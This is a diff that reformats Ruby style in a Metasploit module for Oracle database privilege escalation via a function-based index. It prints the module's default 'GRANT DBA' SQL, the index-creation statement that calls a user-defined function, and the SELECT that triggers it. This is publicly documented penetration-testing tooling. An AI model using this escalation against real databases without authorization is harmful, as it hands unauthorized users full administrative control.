@@ -8,30 +8,33 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::ORACLE
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Oracle DB Privilege Escalation via Function-Based Index',
-      'Description'    => %q{
-        This module will escalate an Oracle DB user to DBA by creating a
-        function-based index on a table owned by a more-privileged user.
-        Credits to David Litchfield for publishing the technique.
-      },
-      'Author'         =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Oracle DB Privilege Escalation via Function-Based Index',
+        'Description' => %q{
+          This module will escalate an Oracle DB user to DBA by creating a
+          function-based index on a table owned by a more-privileged user.
+          Credits to David Litchfield for publishing the technique.
+        },
+        'Author' => [
           'David Litchfield', # Vulnerability discovery and exploit
           'Moshe Kaplan',     # Metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'URL', 'http://www.davidlitchfield.com/Privilege_Escalation_via_Oracle_Indexes.pdf' ],
         ],
-      'DisclosureDate' => '2015-01-21'))
+        'DisclosureDate' => '2015-01-21'
+      )
+    )
 
     register_options(
       [
         OptString.new('SQL', [ true, 'SQL to execute.', "GRANT DBA to #{datastore['DBUSER']}" ]),
         OptString.new('TABLE', [ true, 'Table to create the index on.', 'SYS.DUAL' ]),
-      ])
+      ]
+    )
   end
 
   def run
@@ -55,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
     param_value = Rex::Text.rand_text_alpha(2..6)
 
     create_index = "CREATE INDEX #{index_name} ON " \
-      "#{datastore['TABLE']}(#{datastore['DBUSER']}.#{func_name}('#{param_value}'))"
+                   "#{datastore['TABLE']}(#{datastore['DBUSER']}.#{func_name}('#{param_value}'))"
 
     trigger = "SELECT * FROM #{datastore['TABLE']}"
 
